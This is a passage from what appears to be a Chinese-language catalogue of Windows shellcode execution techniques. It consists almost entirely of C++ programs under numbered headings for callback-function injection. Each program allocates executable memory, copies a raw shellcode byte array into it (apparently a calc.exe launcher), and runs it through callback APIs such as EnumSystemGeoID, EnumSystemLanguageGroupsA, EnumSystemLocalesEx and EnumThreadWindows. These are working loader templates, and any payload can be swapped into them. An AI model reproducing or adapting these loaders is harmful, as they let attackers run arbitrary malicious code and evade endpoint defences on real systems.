class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number"> 78</span><br><span class="linenum hljs-number"> 79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number"> 80</span><br><span class="linenum hljs-number"> 81</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number"> 82</span><br><span class="linenum hljs-number"> 83</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number"> 84</span><br><span class="linenum hljs-number"> 85</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number"> 86</span><br><span class="linenum hljs-number"> 87</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number"> 88</span><br><span class="linenum hljs-number"> 89</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number"> 90</span><br><span class="linenum hljs-number"> 91</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number"> 92</span><br><span class="linenum hljs-number"> 93</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number"> 94</span><br><span class="linenum hljs-number"> 95</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number"> 96</span><br><span class="linenum hljs-number"> 97</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number"> 98</span><br><span class="linenum hljs-number"> 99</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">100</span><br><span class="linenum hljs-number">101</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">102</span><br><span class="linenum hljs-number">103</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">104</span><br><span class="linenum hljs-number">105</span><br><span class="linenum hljs-number">106</span><br><span class="linenum hljs-number">107</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">108</span><br><span class="linenum hljs-number">109</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">110</span><br><span class="linenum hljs-number">111</span><br><span class="linenum hljs-number">112</span><br><span class="linenum hljs-number">113</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)hAlloc,&nbsp;CP_INSTALLED);<br><span class="linenum hljs-number">114</span><br><span class="linenum hljs-number">115</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(GetLastErrorStdStr().c_str());<br><span class="linenum hljs-number">116</span><br><span class="linenum hljs-number">117</span><br><span class="linenum hljs-number">118</span><br><span class="linenum hljs-number">119</span><br><span class="linenum hljs-number">120</span><br><span class="linenum hljs-number">121</span>&nbsp;&nbsp;&nbsp;&nbsp;VirtualFree(hAlloc,<span class="hljs-number">0</span>,&nbsp;MEM_RELEASE);<br><span class="linenum hljs-number">122</span><br><span class="linenum hljs-number">123</span>}<br></code></pre>
<h1 id="h51enumsystemgeoid"><span>51.回调函数注入 通过 EnumSystemGeoID</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumSystemGeoID(GEOCLASS_NATION,<span class="hljs-number">0</span>,(GEO_ENUMPROC)&nbsp;hAlloc);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>}<br></code></pre>
<h1 id="h52enumsystemlanguagegroupsa"><span>52.回调函数注入 通过 EnumSystemLanguageGroupsA</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)&nbsp;hAlloc,LGRPID_SUPPORTED,<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>}<br></code></pre>
<h1 id="h53enumsystemlocales"><span>53.回调函数注入 通过 EnumSystemLocales</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumSystemLocalesEx((LOCALE_ENUMPROCEX)address,&nbsp;LOCALE_ALL,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>}<br></code></pre>
<h1 id="h54enumsystemlocalesa"><span>54.回调函数注入 通过 EnumSystemLocalesA</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumSystemLocalesA((LOCALE_ENUMPROCA)hAlloc&nbsp;,<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>}<br></code></pre>
<h1 id="h55enumthreadwindows"><span>55.回调函数注入 通过 EnumThreadWindows</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum 